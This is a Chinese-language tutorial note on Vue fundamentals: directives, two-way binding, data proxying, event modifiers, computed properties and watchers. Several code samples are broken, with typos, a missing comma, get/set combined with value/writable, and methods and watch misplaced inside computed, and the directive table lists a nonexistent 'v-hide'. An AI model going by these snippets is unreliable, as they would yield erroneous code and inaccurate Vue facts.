Vue2&Vue3

> 可以在vscode中安装三个插件，以便更好的书写代码。
>
> 提高效率：`Vue 3 Snippets`(hollowtree)。
>
> Vue文件代码提示：Vetur(Pine Wu)

[toc]

## 一. Vue概述

> Vue是一套用于构建用户界面的渐进式JavaScript框架
>
> 渐进式：Vue可以自底向上逐层的应用。当开发简单的应用时，只需一个轻量小巧的核心库。当开发复杂应用时，可以引入各式各样的Vue插件。

### 1. Vue的特点：

> 1. 采用组件化模式，提高代码复用率、且让代码更好维护。(网站的每一个模块都封装在Vue文件中)
> 2. 声明式编码，让编码人员无需直接操作DOM，提高开发效率。(如将JSON中的数据转换为页面数据)
> 3. 使用虚拟DOM+优秀的Diff算法，尽量复用DOM节点。(新添加的数据直接进入DOM网页中，而不用重新遍历所有数据)

### 2. Vue的安装：

- 首先进入官网然后左上角学习下拉按钮中选择教程。在教程左侧选择安装。

  [Vue的安装：](https://s1.ax1x.com/2022/04/21/LcRLuV.png)

  ​                 [<img src="https://s1.ax1x.com/2022/04/21/LcRLuV.png" alt="LcRLuV.png" style="zoom: 33%;" />](https://imgtu.com/i/LcRLuV)

- 之后下载开发者版本，下载完成后将文件移动到项目目录中，如果是Java网页开发，则在web目录下新建一个文件夹(js)，然后放入

  [下载好后的Vue.js：](https://s1.ax1x.com/2022/04/21/LcWhKx.png)

  ​                     [<img src="https://s1.ax1x.com/2022/04/21/LcWhKx.png" alt="LcWhKx.png" style="zoom:33%;" />](https://imgtu.com/i/LcWhKx)

### 3. 关闭浏览器调试提示：

> 在开发时，浏览器的调试窗口会一直有警告，这里可以通过下载`Vue tools`工具，和配置警告提示文件解决

~~~JavaScript
//关闭警告提示
Vue.config.productionTip = false 
~~~

### 4. Vue的引入：

~~~JavaScript
<script type= "text/ javascript" src="../js/vue.js"></ script>
//具体路径根据实际情况编写
~~~

## 二. 初始Vue

### 1. Vscode插件引起的错误

> 我们需要注意一个错误，先随便在一个项目中写一段HTML代码，然后运行打开浏览器，这个错误会在浏览器的控制台里显示：

[控制台下的错误：](https://s1.ax1x.com/2022/04/21/Lc4Cgs.png)                         

​								[<img src="https://s1.ax1x.com/2022/04/21/Lc4Cgs.png" alt="Lc4Cgs.png" style="zoom:50%;" />](https://imgtu.com/i/Lc4Cgs)

> 这个错误是因为没有网页图标引起的，但是如果你没有安装Vscode里的`Live Servler`插件，建议安装。这个插件可以模拟Tomcat，将当前的web路径当作根路径在浏览器中显示。
>
> 所以这里解决这个错误很简单，只需要在web项目的根目录下放一张名为favicon.ico的图片即可

[根路径显示为网页：](https://s1.ax1x.com/2022/04/21/LcIAtU.png)

​                               [<img src="https://s1.ax1x.com/2022/04/21/LcIAtU.png" alt="LcIAtU.png" style="zoom:50%;" />](https://imgtu.com/i/LcIAtU)

### 2. 第一个Vue实例

> 我们在使用Vue的时候先要进行实例化。实例化后才能进行接下来的工作。Vue.js 的核心是一个允许采用简洁的模板语法来声明式地将数据渲染进 DOM 的系统，并且参数都是以键值对形式出现：

~~~html
<div id="app">
  {{ message }}
</div>
~~~

~~~JavaScript
var app = new Vue({
  el: '#app',
  data: {
    message: 'Hello Vue!'
  }
})
~~~

输出结果：`Hello Vue!`

简单介绍Vue实例中的参数：

|    参数名    |                             描述                             |
| :----------: | :----------------------------------------------------------: |
| el:selector  | el(Element)用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串。 |
| data{Object} | data中用于存储数据，数据供el所指定的容器去使用。是以键值对形式存储 |
|   {{name}}   | 插值语句，将data对象中所指定的name插入到el指定容器中，里面形式为表达式 |

### 3. ==常见的Vue实例参数==

> 注意一个Vue实例不能同时接管多个容器，且一个容器也只能被一个实例接管。所以容器和实例之间的关系是一对一型的。

|          参数名          |                             描述                             |
| :----------------------: | :----------------------------------------------------------: |
|       el:"options"       |  提供一个在页面上已存在的 DOM 元素作为 Vue 实例的挂载目标。  |
| template:"`<tag></tag>`" | 一个字符串模板作为 Vue 实例的标识使用。模板将会 替换 挂载的元素。挂载元素的内容都将被忽略，除非模板的内容有分发 slot |
|  render: (h)=>{h(App)},  | 字符串模板的代替方案，允许你发挥 JavaScript 最大的编程能力。 |
|           data           | Vue实例的数据对象。Vue 将会递归将 data 的属性转换为 getter/setter，从而让 data 的属性能够响应数据变化 |
|         methods          | methods将被混入到 Vue 实例中，可以直接通过 VM 实例访问这些方法，或者在指令表达式中使用,方法中的 this自动绑定为 Vue 实例 |
|          watch           |    整个为一个对象，键是需要观察的表达式，值是对应回调函数    |
|         computed         | vue的计算属性，将被混入到 Vue 实例中。所有 getter 和 setter 的 this 上下文自动地绑定为 Vue 实例 |
|          props           | 用于父子组件的eventbus传值，是数组或对象，props的成员是子组件接收的来自父组件的数据 |
|        propsData         |           创建实例时传递 props。主要作用是方便测试           |
|         filters          |             包含 Vue 实例可用过滤器来包装数据。              |
|        directives        |             包含 Vue 实例可用的创建自定义指令。              |
|        components        |  （即该组件的子实例）这里是包含 Vue 实例可用组件的哈希表。   |

### 4. 总结

1. 想让Vue工作，就必须创建一个Vue实例， 且要传入一个配置对象；

2. root容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法；

3. root容器里的代码被称为[Vue模板] ；

   [Vue模板：](https://s1.ax1x.com/2022/04/21/LcHvsH.png)

   ​                    				 [<img src="https://s1.ax1x.com/2022/04/21/LcHvsH.png" alt="LcHvsH.png" style="zoom: 50%;" />](https://imgtu.com/i/LcHvsH)

4. 注意区分： js表达式和js代码(语句)

   > 1. 表达式：一个表达式会产生一个值， 可以放在任何一个需要值的地方，即可以被变量接收的语句：
   >    - a
   >    - a+b
   >    - demo(1)
   >    - x===y?    'a':'b'
   > 2. js代码(语句)：
   >    - if(){}
   >    - for(){}

5. Vue实例和容器是一一对应的；

6. 真实开发中只有一个Vue实例，并且会配合着组件一起使用；

## 三. Vue模板语法

> 容器内(HTML标签)内的代码被称为
>
> Vue模板语法包含两类：
>
> 1. 插值语法：如上面展示的代码，这种语法用`{{}}`包裹
> 2. 指令语法：(以V-开头)

### 1. 插值语法

> 功能:用于解析标签体内容。
> 写法: {{xxx}}, xxx是js 表达式，且可以直接读取到data中的所有属性。

~~~html
<body>
    <div id="app">{{ message }}</div>   
</body>
<script>
    var app = new Vue({
        el: '#app',
        data: {
            message: 'Hello Vue!'
        }
    })
</script>
~~~

输出结果：`Hello Vue!`

### 2. ==常见的指令语法==

> Vue里的指令都是以`V-`开头，如：**`v-bind`指令会将标签属性值作为JavaScript表达式执行**，就会被转译成JavaScript表达式执行。
>
> 功能：用于解析标签(包括:标签属性、标签体内容、绑定事件.....)。
> 举例:：v-bind:href="xxx" 或简写为 :href="xxx", xxx同样可以写js表达式，且可以直接读取到data中的所有属性。
> 备注: Vue中有很多的指令，且形式都是: v-????,此处我们只是拿v-bind举个例子：

~~~html
<body>
    <a v-bind:href="url">点我去百度</a>
</body>
<script>
    new Vue({
        el: '#root',
        data:{
            name:'jack' ,
            url:'http://www.baidu.com'
        }
    })
</script>
~~~

> 上面代码中的`V-bind`指令可以将`href="url"`中的`url`转换为JavaScript表达式执行，即`a`标签中的`url`会获取JavaScript中Vue实例中名字叫url的属性值，赋值给`a`标签的href属性。
>
> 所以在浏览器的元素中查看上面的HTML标签会显示：`<a v-bind:href="http://www.baidu.com">点我去百度</a>`
>
> 注意：上面的Vue指令`V-bind`可以简写为`:`，所以上面案例可以改为：

~~~html
<body>
    <a :href="url">点我去百度</a>
</body>
~~~

- Vue常见指令：

  |    指令名     |                             描述                             |  简写   |
  | :-----------: | :----------------------------------------------------------: | :-----: |
  | v-model:value |                      实现标签的双向绑定                      | v-model |
  |    v-show     |                           显示内容                           |         |
  |    v-hide     |          隐藏内容(给display：none的属性 让它不显示)          |         |
  |     v-if      | 后面的是一个表达式或者也可以是返回true或false的表达式用于**显示与隐藏** （如果值为false，该处内容会被注释掉，已达到不显示效果） |         |
  |   v-else-if   | 必须和 v-if 连用 v-else 必须和 v-if 连用 不能单独使用 否则报错 模板编译错误 |         |
  |     v-for     |           基于数据渲染一个列表，类似于JS中的遍历。           |         |
  |    v-bind     |                           属性绑定                           |    :    |
  |     v-on:     |      给标签绑定函数常用的事件有：click、keyup、keydown       |    @    |
  |    v-text     |                    向所在的标签中插入文本                    |         |

### 3. 插值语法与指令语法具体使用情况

> 插值语法往往用于标签体内容，而指令语法往往用于标签属性。

### 4. 双向绑定指令

> 之前我们学习的`v-bind`指令只能实现单向绑定，即网页数据变化，并不会影响Vue实例中变量的变化。如下：

[V-bind单向绑定：](https://s1.ax1x.com/2022/04/23/LWyvdS.png)

​								[<img src="https://s1.ax1x.com/2022/04/23/LWyvdS.png" alt="LWyvdS.png" style="zoom:33%;" />](https://imgtu.com/i/LWyvdS)

> 由上图可知，我们输入框中的内容是`1234`而Vue实例中的name值为`123`，由此可知，Vue实例与页面是单向绑定的，页面的改变影响不了VUe实例的值。但在项目开发中很多时候我们需要进行**双向绑定**。即任何一方发生改变，双方都改变。此时就需要用到
>
> `v-model:`指令，该指令可以解决上述问题：页面和实例数据如果改变，都改变。也可简写为`v-model='value'`下面进行示例：

~~~html
<body>
    <div id="root"> 
        双向数据绑定: <input type="text" v-model:value="name">		<!--这里可以实现相同的效果-->
        双向数据绑定: <input type="text" v-model="name">
    </div>
</body>
<script type="text/javascript">
    Vue. config. productionTip = false //阻止vue在启动时生成生产提示。
    new Vue({
        el: '#root'
        data:{
        name: '123'
    })
</script>
~~~

页面输出时我们在输入框内部输入信息，可以看到Vue示例也跟着变化：

[v-model运行结果：](https://s1.ax1x.com/2022/04/23/LW6gYQ.png)

​									[<img src="https://s1.ax1x.com/2022/04/23/LW6gYQ.png" alt="LW6gYQ.png" style="zoom:33%;" />](https://imgtu.com/i/LW6gYQ)

注意：`v-model:`指令只能用在表单类元素(输入类元素)上

### 5. el和data的两种写法

> 这里Vue示例里的`el`和`data`参数可以有两种写法，上面的示例展示的是第一种写法，我们还有较为简便灵活的写法

- el的第二种写法

  > 格式：变量.$mount('选择器')
  >
  > 通过这种写法也可以实现Vue实例与容器绑定，更多的用在代码执行部分后实现容器内容改变。

  ~~~javascript
  Vue.config.productionTip = false //阻止vue在启动时生成生产提示。
  //e1的两种写法
  const v = new Vue({
      data:{
          name:'hello'
      }
  })
  v.$mount('#root') //第二种写法
  ~~~

- data的第二种写法(函数式写法)

  > 格式：data：function(){return{key:value}}
  >
  > 多应用于组件部分

  ~~~JavaScript
  Vue.config.productionTip = false //阻止vue在启动时生成生产提示。
  //e1的两种写法
  const v = new Vue({
      el:'#root',
      data:function(){
          return{
              key:value
          }
      }
  })
  ~~~

- 总结

  > 1. e1有2种写法：
  >    - new Vue时候配置e1属性。
  >    - 先创建Vue实例，随后再通过vm.$mount('#root')指定e1的值。
  > 2. data有2种写法
  >    - 对象式
  >    - 函数式：如何选择:目前哪种写法都可以，以后学习到组件时，data必须使用函数式，否则会报错。
  > 3. 一个重要的原则：由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例，而是Windows实例。

## 四. MVVM模型与数据代理

> MVVm模型是Vue实例的原理，数据代理通过一个对象代理对另一个对象中属性的操作（读/写）

### 1.  MVVM模型概述

> 1. M:模型(Model) :对应data中的数据
>
> 2. V:视图(View) :HTML中的模板语句
> 3. VM:视图模型(ViewModel) : Vue 实例对象

[MVVM模型：](https://s1.ax1x.com/2022/04/23/Lf3IM9.png)

​											[<img src="https://s1.ax1x.com/2022/04/23/Lf3IM9.png" alt="Lf3IM9.png" style="zoom: 50%;" />](https://imgtu.com/i/Lf3IM9)

~~~html
<body> 
    <!--准备好一个容器-->
    <div id="root"> 
        <h1>学校名称: {{name}}</h1>
        <h1>学校地址: {{address}}</h1>
    </div> 
</body>
<script>
    Vue.config.productionTip = false //阻止vue在启动时生成生产提示。
    const vm = new Vue({
        el:'#root',
        data:{
            name: 'shi',
            address: '北京'
        })
</script>
~~~

[MVVM模型介绍：](https://s1.ax1x.com/2022/04/23/LfJfG8.png)

​										[<img src="https://s1.ax1x.com/2022/04/23/LfJfG8.png" alt="LfJfG8.png" style="zoom: 50%;" />](https://imgtu.com/i/LfJfG8)

- 总结：

  > MVVM模型
  > 1. M:模型(Model) : data中的数据
  > 2. V:视图(View) :模板代码
  > 2. VM: 视图模型(ViewModel): Vue实例
  >
  > 观察发现:
  >
  > 1. data中所有的属性，最后都出现在了vm身上。
  > 2. vm身上所有的属性及Vue原型上所有属性，在Vue模板中都可以直接使用。

### 2. 数据代理

> vue 数据代理： 通过vm对象来代理data中所有属性的操作，更方便精确操作data中的数据
>
> 其本质是通过一个对象代理另一个对象中的属性的操作（读 / 写 ）

#### 2.1 Object.defineProperty()方法

> 该方法会直接在一个对象上定义一个新属性，或者修改一个对象的现有属性，并返回此对象，但要注意新添加的属性不能参与遍历。
>
> 语法如下：

~~~JavaScript
Object.defineProperty(obj, prop, descriptor)
~~~

|   参数名   |               描述                |
| :--------: | :-------------------------------: |
|    obj     |        要定义属性的对象。         |
|    prop    | 要定义或修改的属性的名称或 Symbol |
| descriptor |    要定义或修改的属性描述符。     |

有两种属性描述符：数据属性描述符、存取属性描述符

|   描述符名   |                             说明                             |                           默认情况                           |
| :----------: | :----------------------------------------------------------: | :----------------------------------------------------------: |
| configurable | 示属性是否可以通过delete删除，是否可以修改特性，是否可以将它修改为存取属性 | 当我们直接在一个对象上定义某个属性时，它的默认值是true，而当我们通过属性描述符进行定义属性时，它的默认值是false |
|  enumerable  |    表示属性是否可以通过for-in遍历或者Object.keys返回属性     | 当我们直接在一个对象上定义某个属性时，他的默认值是true，而当我们通过属性描述符进行定义属性时，他的默认值是false |
|   writable   |                     表示是否可以修改属性                     | 当我们直接在一个对象上定义某个属性时，他的默认值是true，而当我们通过属性描述符进行定义属性时，他的默认值是false |
|    value     | 属性的value值，当读取属性时会返回value，修改属性时会修改value |                  默认情况下value是undefined                  |
|     get      |                     获取属性时执行的函数                     |                       默认为undefined                        |
|     set      |                设置或者修改属性值时执行的函数                |                       默认为undefined                        |

**注意：writable、value不能和get、set一起使用**

~~~javascript
let Person = {name: '张',sex:'男'}
Object.defineProperty(Person, 'age', {
    value: '18',
    writable: true,		// 变量是否可以改变
    enumerable:truem,	//控制属性是否可以枚举，默认值是false
    configurable:true,	//控制属性是否可以被删除，默认值是false   
    get(){				//当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
        console.log('有人读取age属性了')
        return number 
    },    
    set(value){			//当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值
        console.log('有人修改了age属性，且值是',value)
        number=value
    }
})
Person.name='rose' 
console.log (Person.name)
//结果：rose
~~~

#### 2.2 数据代理演示

~~~javascript
let obj = {x:100}
let obj2 = {y:200}
0bject.defineProperty(obj2,'x',{
    get(){
        return obj.X
    },
    set(value){
        obj.x = value
    }
})
~~~

> 上面的代码是一个经典的数据代理案例。其中`get`方法在obj2中追加一个属性`x`，并且值为obj里的x值。所以当有人访问obj2时，其实就相当于访问obj中的`x`值。
>
> `set`方法是当有人想修改obj2中`x`的值，就等于修改obj中的`x`值。由于obj2中`x`的值是obj中的`x`值，所以这里的set方法就是修改obj中的`x`值。已达到修改obj2中`x`的值 

[数据代理图示：](https://s1.ax1x.com/2022/04/24/L4LNut.png)								[<img src="https://s1.ax1x.com/2022/04/24/L4LNut.png" alt="L4LNut.png" style="zoom: 50%;" />](https://imgtu.com/i/L4LNut)

- 总结：

  > 1. Vue中的数据代理:：
  > 通过vm对象来代理data对象中属性的操作(读/写)
  > 1. Vue中数据代理的好处：
  > 更加方便的操作data中的数据
  > 1. 基本原理：
  > 通过Object.defineProperty( )把data对象中所有属性添加到vm上。
  > 为每一个添加到vm上的属性，都指定一个getter/setter方法。
  > 在getter/setter内部去操作(读/写) data中对应的属性。

## 五. 事件处理

> Vue简写了事件处理方式，要注意的是事件处理只能在Vue实例中定义。

### 1. 点击事件

> 可以用`v-on:click`(也可简写为：`@click='functionName'`)在容器中实现点击事件的绑定。同时，在vue实例中需要将事件函数写入`methods`参数中。参数methods介绍如下：

|  参数名   |                             描述                             |
| :-------: | :----------------------------------------------------------: |
| methods： | 里面放如事件函数或者方法，其中可以有多个事件函数，但方法名不能一样。函数可以接收参数 |

`v-on:click`指令介绍：

|           指令名            |                             描述                             |
| :-------------------------: | :----------------------------------------------------------: |
| v-on:click课简写为：@click= | 值为一个与methods中相对应的事件函数名。可以加入参数，但注意加入参数时用`$event`参数占位，用来接收事件参数event。 |

~~~html
<body>
    <!--准备好一个容器--> 
    <div id="root"> 
        <h2>欢迎来到{{name}}学习</h2>
        <!-- <button v-on : click="showInfo">点我提示信息</button> -->
        <button @click= "showTnfo1" >点我提示信息1</button>
        <button @click=" showInfo2(666,$evnet)">点我提示信息2</button>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false //阻止vue在启动时生成生产提示。
    const Vm = new Vue({
        el:'#root',
        data:{
            name: 'shi'
        },
        methods:{
            showTnfo1(event){
                // console . log(event . target。innerText)
                // console. log(this) // 此处的this是vm
                alert('同学你好')
            },
            showTnfo2(event,number){
                console.log(event,number)
                // console.log(this) // 此处的this是vm
            }
        }
    })
</script>
~~~

[点击提示信息2结果：](https://s1.ax1x.com/2022/04/24/L59jaR.png)									[<img src="https://s1.ax1x.com/2022/04/24/L59jaR.png" alt="L59jaR.png" style="zoom: 50%;" />](https://imgtu.com/i/L59jaR)

- 总结：

  > 1. 使用v-on:XXx或@xxx绑定事件，其中xxx是 事件名；
  > 2. 事件的回调需要配置在methods对象中，最终会在vm上；
  >
  > 3. methods中配置的函数，不要用箭头函数!否则this就不是vm了；
  > 4. methods中配置的函数，都是被Vue所管理的函数，this的指向是vm或组件实例对象；
  > 5. @click="demo"和@click="demo($event)"效果一致， 但后者可以传参；

### 2. 事件修饰符

> 为了更纯粹的数据逻辑，vue提供了很多事件修饰符，来代替处理一些 DOM 事件细节。常用的Vue事件修饰符如下：

| 修饰符名 |                       描述                        |
| :------: | :-----------------------------------------------: |
| prevent  |               阻止默认事件(常用) ;                |
|   stop   |                阻止事件冒泡(常用)                 |
|  once:   |              事件只触发一次(常用) ;               |
| capture: |                使用事件的捕获模式;                |
|  self:   |   只有event.target是当前操作的元素时才触发事件;   |
| passive: | 事件的默认行为立即执行，无需等待事件回调执行完毕; |

- stop

  > 防止事件冒泡，通俗来说就是阻止事件向父元素传递，阻止任何父事件处理程序被执行，等同于JavaScript中的event.stopPropagation()。

  ~~~html
  <div id="app">
      <div @click="outer">
          <div  @click="middle">
              <button @click="inner">点击</button>
          </div>
      </div>
  </div>
  <script>
      const Vm = new Vue({
          methods:{
              inner: function () {
                  console.log ('inner')
              },
              middle: function () {
                  console.log ('middle')
              },
              outer: function () {
                  console.log ('outer')
              }
          }
      })
  </script>
  ~~~

  运行结果：

  ```html
  inner  
  middle  
  outer
  ```

  > 从上面的结果我们可以观察到，在button标签外包了两层div，每层都绑定了监听器，监听click事件，这时候我们点击最内层的按钮，外面两层对应的点击事件也会被触发。
  >
  > 解决办法：内层按钮的事件绑定加上stop修饰符，就不会向上冒泡了

  ~~~HTML
  <button @click.stop="inner">点击</button>
  ~~~

- prevent

  > preventDefault缩写某些标签拥有自身的默认事件，比如`<a>`标签点击后会进行页面的跳转。这类默认事件虽然是冒泡后开始的，但不会因为stop而停止执行。阻止执行这类预设的行为，prevent就派上用场了。

  ~~~html
  <a href="http://www.baidu.com" @click.prevent>点击跳转</a>
  ~~~

- capture

  > 捕获冒泡，即冒泡发生时，有.capture修饰符的dom元素会优先执行。

  ~~~html
  <div @click="outer">
      <div @click.capture="middle">
          <button @click="inner">点击</button>
      </div>
  </div>
  <script>
      const Vm = new Vue({
          methods:{
              inner: function () {
                  console.log ('inner')
              },
              middle: function () {
                  console.log ('middle')
              },
              outer: function () {
                  console.log ('outer')
              }
          }
      })
  </script>
  ~~~

  运行结果：

  ~~~JavaScript
  middle
  inner   
  outer
  ~~~

  > 这时候打印顺序发生改变了，中间层的信息被优先打印出来，然后再按正常顺序执行触发的事件。我们将外层的点击事件加上.capture修饰符，结果：

  ```html
  <div @click.capture="outer">
      <div @click.capture="middle">
          <button @click="inner">点击</button>
      </div>
  </div>
  <!--运行结果：
  outer
  middle
  inner  
  -->
  ```

  > 我们可以观察到：带修饰符的从外到内依次执行，然后再按正常顺序执行触发的事件。

- self

  > 将事件绑定到自身，只有自身才能触发，通常用于避免冒泡事件的影响。

  ~~~html
  <div id="demo">
      <div @click="outer">
          <div  @click.self="middle">
              <button @click="inner">点击</button>
          </div>
      </div>
  </div>
  <!--运行结果：
  inner
  outer
  -->
  ~~~

  > 给中间的div加上self修饰符，然后点击里层的按钮，发现中间层的事件没有被触发，直接跳过了。
  >
  > 而直接点中间层div对应的区域，才能触发其事件：

  ~~~html
  middle
  outer
  ~~~

- once

  > 这个比较好理解，加上once修饰符以后事件只触发一次，但是不影响事件的冒泡，上层的事件仍然会被触发，并且页面刷新后这个次数会重置。

  ```html
  <div @click="outer">
      <div @click="middle">
          <button @click.once="inner">点击</button>
      </div>
  </div>
  ```

  连续点击按钮三次结果：

  ~~~JavaScript
  inner
  middle
  outer
  
  middle
  outer
  
  middle
  outer
  ~~~

- passive

  > passive是2.3.0 新增的修饰符，是用来告诉浏览器你不想阻止事件的默认行为。
  >
  > 使用.passive就可以提前告诉浏览器，我们没有用preventDefault阻止默认动作，你也不用反复去判断了，从而提高性能解决卡顿。如：如果滑轮滚动绑定的有事件，则会等待绑定事件完成后进行默认滚动，而加了该事件修饰符后，会限制性滚动，在进行滚动事件。

### 3. 键盘事件

> Vue中常用的按键别名：

| 案件名称 |               别名                |
| :------: | :-------------------------------: |
|   回车   |               enter               |
|   删除   |   delete (捕获“删除”和“退格”键)   |
|   退出   |                esc                |
|   空格   |               space               |
|   换行   | tab (特殊，必须配合keydown去使用) |
|    上    |                up                 |
|    下    |               down                |
|    左    |               left                |
|    右    |               right               |

> 1. Vue未提供的别名按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case(短横线命名)
> 2. 系统修饰键(用法特殊) : ctrl、 alt、 shift、 meta(Windows徽标键)
>    - 配合keyup使用:按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
>    - 配合keydown使用:正 常触发事件。
> 3. 也可以使用keyCode去指定具体的按键(不推荐)
> 4. Vue.config.keyCodes 自定义键名 = 键码，可以去定制按键别名(也不建议使用)
> 5. 语法格式如下：

~~~JavaScript
//以下代码表明当按下要触发事件的按键后，会触发后面绑定的函数
@keyup.按键名="要触发的函数"
//定义别名语法：
Vue.config.keyCodes.huiche = 13 //定义了一个 别名按键
~~~

示例：

~~~html
<div id="root">
    <input type= "text" placeholder="按下回车提示输入" @keyup.enter="showInfo">
</div>
<script>
    Vue.config.productionTip = false //阻止vue在启动时生成生产提示。
    new Vue({
        methods: {
            showInfo(e){
                console.log(e.target.value) 
            }
        }
    })
</script>
~~~

> 以上代码是当用户在浏览器输入框内输入文字后，按下回车键，触发事件函数，会将输入框内的文字输出在控制台。
>
> 也可以定义一个组合按键，如定义ctrl+i为：

~~~html
<input type= "text" placeholder="按下回车提示输入" @keyup.ctrl.i="showInfo">
~~~

- 总结：

  > 事件的基本使用:
  >
  > 1. 使用v-on:Xx或xxx绑定事件，其中xxx是事件名;
  > 2. 事件的回调需要配置在methods对象中，最终会在vm上;
  >
  > 3. methods中配置的函数，不要用箭头函数!否则this就不是vm了;
  > 4. methods中配置的函数，都是被Vue所管理的函数，this的指向是vm或组件实例对象;
  > 5. @click="demo"和@click="demo($event)" 效果一致， 但后者可以传参;

## 六. 计算属性

> 模板内的表达式非常便利，但是设计它们的初衷是用于**简单运算的**。在模板中放入太多的逻辑会让模板过重且难以维护。
>
> **计算属性的用法**：在一个计算属性里可以完成各种复杂的逻辑，包括运算、函数调用等，只要最终返回一个结果就可以。简单说就是将定义好的属性经过计算加工等生成一个全新的属性。 这里我们需要用到Vue实例参数中的`computed`该属性描述如下：

|  参数名  |                             描述                             |
| :------: | :----------------------------------------------------------: |
| computed | 计算属性允许我们对指定的视图，复杂的值计算。这些值将绑定到依赖项值，只在需要时更新。其中的属性值读取必须要用到`this`关键字 |

#### 4.1 computed内置对象的get()方法：

~~~html
<div id=" root"> 
    姓: <input type="text" v-model="firstName"> <br/><br/>
    名: <input type="text" v -model="lastName"> <br/><br/>
    全名: <span>{{fullName}}</span>
</div>
<script>
    Vue.config.productionTip = false //阻止vue在启动时生成生产提示。
    const Vm = new Vue({
        el: '#root',
        data:{
            firstName:'张',
            lastName:'三'
        },
        computed:{
            fullName:{
                //get有什么作用?当有人读取ful1Name时，get就会被调用，且返回值就作为fullName的值
                get(){
                    console.log( 'get被调用了')
                    // console. log(this) //此处的this是vm
                    return this.firstName +'-'+ this.lastName
                }
            }
        }
    })
</script>
~~~

执行结果：`张-三`，不管输入什么输出结果都是：`xxx-xxx`的格式。

> 这里的`computed`参数内定义了一个fullName对象，但是和普通的对象调用不同的是，此处直接使用对象名就可以调用`get()`方法。因为Vue示例获取了`get()`方法的返回值，然后绑定到了对象fullName上。所以插值语句直接写`fullName`而不是`fullName.get()`

**注意：get什么时候被调用：1.初次读取fullName时。2.所依赖的数据发生变化时。**

#### 4.2 computed内置对象的set()方法

> 以上的对象中get()方法只能读取值，而当我们需要修改fullName值时，我们就需要用到`set()`方法。
>
> set只有当对象被修改时候才会调用，有一个参数，为接收到的值。

~~~html
<div id=" root"> 
    姓: <input type="text" v-model="firstName"> <br/><br/>
    名: <input type="text" v -model="lastName"> <br/><br/>
    全名: <span>{{fullName}}</span>
</div>
<script>
    Vue.config.productionTip = false //阻止vue在启动时生成生产提示。
    const Vm = new Vue({
        el: '#root',
        data:{
            firstName:'张',
            lastName:'三'
        },
        computed:{
            fullName:{
                //get有什么作用?当有人读取ful1Name时，get就会被调用，且返回值就作为fullName的值
                get(){
                    console.log( 'get被调用了')
                    // console. log(this) //此处的this是vm
                    return this.firstName +'-'+ this.lastName
                },
                set(value){
                    //切割修改的值
                    arr = value.split('-')
                    this.firstName = arr[0]
                    this.lastName = arr[1]
                }
            }
        }
    })
</script>
~~~

此时运行当我们通过控制台输入：`fullName='李-四'`时候，页面就会进行修改，fullName返回值为`李-四`。

#### 4.3 计算属性的简写

> 大部分时候计算属性是为了将数据加工后展示在页面上，不进行修改的。此时如果你确定你的计算属性是为了在页面上展示数据。那么就可以用到计算机属性的简写。上面的代码可以简写为一下：

~~~html
<div id=" root"> 
    姓: <input type="text" v-model="firstName"> <br/><br/>
    名: <input type="text" v -model="lastName"> <br/><br/>
    全名: <span>{{fullName}}</span>
</div>
<script>
    Vue.config.productionTip = false //阻止vue在启动时生成生产提示。
    const Vm = new Vue({
        el: '#root',
        data:{
            firstName:'张',
            lastName:'三'
        },
        computed:{
            fu1lName:function( ){
                console.log('get被调用了')
                return this.firstName+'-'+this. lastName
            }
        }
    })
</script>
~~~

#### 4.4 总结

1. 定义:要用的属性不存在，要通过已有属性计算得来。
2. 原理:底层借助了objcet。defineproperty方法提供的getter和setter. 、
3. 优势:与methods 实现相比，内部有缓存机制(复用)，效率更高，调试方便。
4. get函数什么时候执行?
   - 初次读取时会执行一次。
   - 当依赖的数据发生改变时会被再次调用。

5. 备注:
   - 计算属性最终会出现在vm上，直接读取使用即可。
   - 如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。

## 七. 监视属性

> 写在Vue对象的`watch`参数中，它的值是配置对象——即属性名。当被监听的属性改变时，回调函数自动调用，进行相关操作。
>
> 监视的属性必须存在，才能进行监视。

watch监视属性详情：

|    参数详情    |                             描述                             |
| :------------: | :----------------------------------------------------------: |
| watch(monitor) | 整个为一个对象，键(方法名)是需要观察的表达式，值(对应监听函数)是对应回调函数 |

### 1. watch内置对象handler()方法

> 和计算属性的computed参数一样，该参数内部方法名为要监听的参数或者方法名。但每个方法中要定义`handler()`方法。该方法有两个参数：`newValue`(修改后的属性值)和`oldvalue`(原先的属性值)。它们分别接受新值和旧值。

~~~html
<body>
    <!-- 准备好一个容器-->
    <div id="root">
        <h2>今天天气很{{info}}</h2>
        <button @click=" changeWeather">切换天气</button>
    </div>
</body>
<script type="text/javascript" >
    Vue.config.productionTip = false //阻止vue在启动时生成生产提示。
    const Vm = new Vue({
        el:'#root',
        data:{
            isHot:true,
        },
        computed:{
            info(){
                return this.isHot? '炎热':'凉爽';
            },
            methods: {
                changeWeather(){
                    this.isHot = !this.isHot 
                }
            },
            watch:{
                isHot:{
                    //handler什么时候调用?当isHot发 生改变时。
                    handler(){
                        console. log('isHot被修改了')
                    }
                }
            }
        })
</script>
</body>
~~~

> 上面代码能达到点击按钮实现天气效果切换效果。watch内的参数表示当isHot值改变时，就会触发handler()方法。

### 2. watch内置对象的immediate方法

>  handler特点是：最初绑定时不会执行，等到 监听的值改变时才执行监听计算。如果想要一开始就让他在最初绑定的时候就执行监听函数，就需要用到immediate。该参数介绍如下：

|         方法名         |                             描述                             |
| :--------------------: | :----------------------------------------------------------: |
| immediate(true\|false) | 参数为true时，当事件被绑定时直接执行。参数为false时，当事件被调用时候才会执行。其作用主要是初始化时让handler()调用以下。 |

对以上案例进行修改：

~~~html
<body>
    <!-- 准备好一个容器-->
    <div id="root">
        <h2>今天天气很{{info}}</h2>
        <button @click=" changeWeather">切换天气</button>
    </div>
</body>
<script type="text/javascript" >
    Vue.config.productionTip = false //阻止vue在启动时生成生产提示。
    const Vm = new Vue({
        el:'#root',
        data:{
            isHot:true,
        },
        computed:{
            info(){
                return this.isHot? '炎热':'凉爽';
            },
            methods: {
                changeWeather(){
                    this.isHot = !this.isHot 
                }
            },
            watch:{
                isHot:{
                    immediate:true,
                    //handler什么时候调用?当isHot发 生改变时。
                    handler(){
                        console. log('isHot被修改了')
                    }
                }
            }
        })
